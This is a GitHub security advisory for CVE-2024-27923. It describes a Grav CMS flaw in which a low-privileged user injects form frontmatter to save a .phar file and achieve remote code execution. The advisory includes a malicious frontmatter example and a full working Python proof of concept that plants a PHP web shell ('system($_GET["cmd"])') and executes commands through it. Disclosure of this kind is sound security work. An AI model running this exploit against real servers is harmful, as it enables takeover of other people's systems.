# [H] Remote Code Execution by uploading a phar file using frontmatter

## Summary
Severity: High
Advisory: GHSA-f6g2-h7qv-3m5v
CVE: CVE-2024-27923
CWE: CWE-287, CWE-434
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-03-06
Source: https://github.com/advisories/GHSA-f6g2-h7qv-3m5v
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <1.7.43

## Details
### Summary
- Due to insufficient permission verification, user who can write a page use frontmatter feature.
- Inadequate File Name Validation

### Details
1. Insufficient Permission Verification

In Grav CMS, "[Frontmatter](https://learn.getgrav.org/17/content/headers)" refers to the metadata block located at the top of a Markdown file. Frontmatter serves the purpose of providing additional information about a specific page or post.
In this feature, only administrators are granted access, while regular users who can create pages are not. However, if a regular user adds the data[_json][header][form] parameter to the POST Body while creating a page, they can use Frontmatter. The demonstration of this vulnerability is provided in video format. [Video Link](https://www.youtube.com/watch?v=EU1QA0idoWE)

2. Inadequate File Name Validation

To create a Contact Form, Frontmatter and markdown can be written as follows:
[Contact Form Example](https://learn.getgrav.org/17/forms/forms/example-form)
[Form Action Save Option](https://learn.getgrav.org/17/forms/forms/reference-form-actions#save)
When an external user submits the Contact Form after filling it out, the data is stored in the user/data folder. The filename under which the data is stored corresponds to the value specified in the filename attribute of the process property. For instance, if the filename attribute has a value of "feedback.txt," a feedback.txt file is created in the user/data/contact folder. This file contains the value entered by the user in the "name" field. The problem with this functionality is the lack of validation for the filename attribute, potentially allowing the creation of files such as phar files on the server. An attacker could input arbitrary PHP code into the "name" field to be saved on the server. However, Grav filter the < and > characters, so to disable these options, an xss_check: false attribute should be added. [Disable XSS](https://learn.getgrav.org/17/forms/forms/form-options#xss-checks)

```
---
title: Contact Form

form:
    name: contact
    xss_check: false

    fields:
        name:
          label: Name
          placeholder: Enter your name
          autocomplete: on
          type: text
          validate:
            required: true

    buttons:
        submit:
          type: submit
          value: Submit

    process:
        save:
            filename: this_is_file_name.phar
            operation: add

---

# Contact form

Some sample page content
```

Exploiting these two vulnerabilities allows the following scenario:

- A regular user account capable of creating pages is required.
- An attacker creates a Contact Form page containing malicious Frontmatter using the regular user's account.
- Accessing the Contact Form page, the attacker submits PHP code.
- The attacker attempts Remote Code Execution by accessing HOST/user/data/[form-name]/[filename].

### PoC

[PoC Video Link](https://www.youtube.com/watch?v=Gh3ezpORbPc)

```python
# PoC.py
import requests
from bs4 import BeautifulSoup

class Poc:

    def __init__(self, cmd):
        self.sess = requests.Session()

        ##########    INIT    ################
        self.USERNAME = "guest"
        self.PASSWORD = "Guest123!"
        self.PREFIX_URL = "http://192.168.12.119:8888/grav"
        self.PAGE_NAME = "this_is_poc_page47"
        self.PHP_FILE_NAME = "universe.phar"
        self.PAYLOAD = '<?php system($_GET["cmd"]); ?>'
        self.cmd = cmd
        ##########    END    ################

        self.sess.get(self.PREFIX_URL)
        self._login()
        self._save_page()
        self._inject_command()
        self._execute_command()
    

    def _get_nonce(self, data, name):
        # Get login nonce value
        res = BeautifulSoup(data, "html.parser")
        return res.find("input", {"name" : name}).get("value")

    
    def _login(self):
        print("[*] Try to Login")
        res = self.sess.get(self.PREFIX_URL + "/admin")

        login_nonce = self._get_nonce(res.text, "login-nonce")

        # Login
        login_data = {
            "data[username]" : self.USERNAME,
            "data[password]" : self.PASSWORD,
            "task" : "login",
            "login-nonce" : login_nonce
        }
        res = self.sess.post(self.PREFIX_URL + "/admin", data=login_data)

        # Check login
        if res.status_code != 303:
            print("[!] username or password is wrong")
            exit()
        
        print("[*] Success Login")


    def _save_page(self):
        print("[*] Try to write page")

        res = self.sess.get(self.PREFIX_URL + f"/admin/pages/{self.PAGE_NAME}/:add")
        form_nonce = self._get_nonce(res.text, "form-nonce")
        unique_form_id = self._get_nonce(res.text, "__unique_form_id__")

        # Add page data
        page_data  = f"task=save&data%5Bheader%5D%5Btitle%5D={self.PAGE_NAME}&data%5Bcontent%5D=content&data%5Bheader%5D%5Bsearch%5D=&data%5Bfolder%5D={self.PAGE_NAME}&data%5Broute%5D=&data%5Bname%5D=form&data%5Bheader%5D%5Bbody_classes%5D=&data%5Bordering%5D=1&data%5Border%5D=&data%5Bheader%5D%5Border_by%5D=&data%5Bheader%5D%5Border_manual%5D=&data%5Bblueprint%5D=&data%5Blang%5D=&_post_entries_save=edit&__form-name__=flex-pages&__unique_form_id__={unique_form_id}&form-nonce={form_nonce}&toggleable_data%5Bheader%5D%5Bpublished%5D=0&toggleable_data%5Bheader%5D%5Bdate%5D=0&toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bmetadata%5D=0&toggleable_data%5Bheader%5D%5Bdateformat%5D=0&toggleable_data%5Bheader%5D%5Bmenu%5D=0&toggleable_data%5Bheader%5D%5Bslug%5D=0&toggleable_data%5Bheader%5D%5Bredirect%5D=0&toggleable_data%5Bheader%5D%5Bprocess%5D=0&toggleable_data%5Bheader%5D%5Btwig_first%5D=0&toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&toggleable_data%5Bheader%5D%5Bchild_type%5D=0&toggleable_data%5Bheader%5D%5Broutable%5D=0&toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&toggleable_data%5Bheader%5D%5Bvisible%5D=0&toggleable_data%5Bheader%5D%5Bdebugger%5D=0&toggleable_data%5Bheader%5D%5Btemplate%5D=0&toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&toggleable_data%5Bheader%5D%5Bredirect_default_route%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0"
        page_data += f"&data%5B_json%5D%5Bheader%5D%5Bform%5D=%7B%22xss_check%22%3Afalse%2C%22name%22%3A%22contact-form%22%2C%22fields%22%3A%7B%22name%22%3A%7B%22label%22%3A%22Name%22%2C%22placeholder%22%3A%22Enter+php+code%22%2C%22autofocus%22%3A%22on%22%2C%22autocomplete%22%3A%22on%22%2C%22type%22%3A%22text%22%2C%22validate%22%3A%7B%22required%22%3Atrue%7D%7D%7D%2C%22process%22%3A%7B%22save%22%3A%7B%22filename%22%3A%22{self.PHP_FILE_NAME}%22%2C%22operation%22%3A%22add%22%7D%7D%2C%22buttons%22%3A%7B%22submit%22%3A%7B%22type%22%3A%22submit%22%2C%22value%22%3A%22Submit%22%7D%7D%7D"
        res = self.sess.post(self.PREFIX_URL + f"/admin/pages/{self.PAGE_NAME}/:add" , data = page_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})

        print("[*] Success write page: " + self.PREFIX_URL + f"/{self.PAGE_NAME}")


    def _inject_command(self):
        print("[*] Try to inject php code")

        res = self.sess.get(self.PREFIX_URL + f"/{self.PAGE_NAME}")
        form_nonce = self._get_nonce(res.text, "form-nonce")
        unique_form_id = self._get_nonce(res.text, "__unique_form_id__")

        form_data = f"data%5Bname%5D={self.PAYLOAD}&__form-name__=contact-form&__unique_form_id__={unique_form_id}&form-nonce={form_nonce}"

        res = self.sess.post(self.PREFIX_URL + f"/{self.PAGE_NAME}" , data = form_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})

        print("[*] Success inject php code")


    def _execute_command(self):
        res = self.sess.get(self.PREFIX_URL + f"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}")

        if res.status_code == 404:
            print("[!] Fail to execute command or not save php file.")
            exit()

        print("[*] This is uploaded php file url.")
        print(self.PREFIX_URL + f"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}")
        print(res.text)


if __name__ == "__main__":
    Poc(cmd="id")
```

### Impact

Remote Code Execution

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-f6g2-h7qv-3m5v
- https://github.com/getgrav/grav/commit/e3b0aa0c502aad251c1b79d1ee973dcd93711f07
- https://github.com/getgrav/grav
